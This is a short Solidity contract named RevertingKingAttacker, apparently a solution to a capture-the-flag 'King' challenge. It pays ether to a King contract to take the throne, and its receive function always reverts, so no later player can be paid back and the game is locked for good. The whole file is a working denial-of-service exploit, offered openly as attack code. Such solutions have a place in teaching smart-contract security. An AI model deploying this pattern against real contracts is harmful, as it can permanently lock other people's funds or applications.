
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint256);
    function king() external view returns (address);
}

contract RevertingKingAttacker {
    IKing public kingContract;

    constructor(address _kingAddress) {
        kingContract = IKing(_kingAddress);
    }

    receive() external payable {
        revert("I don't want your money!");
    }

    function becomeKing() public payable {
        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Failed to become king");
    }
}
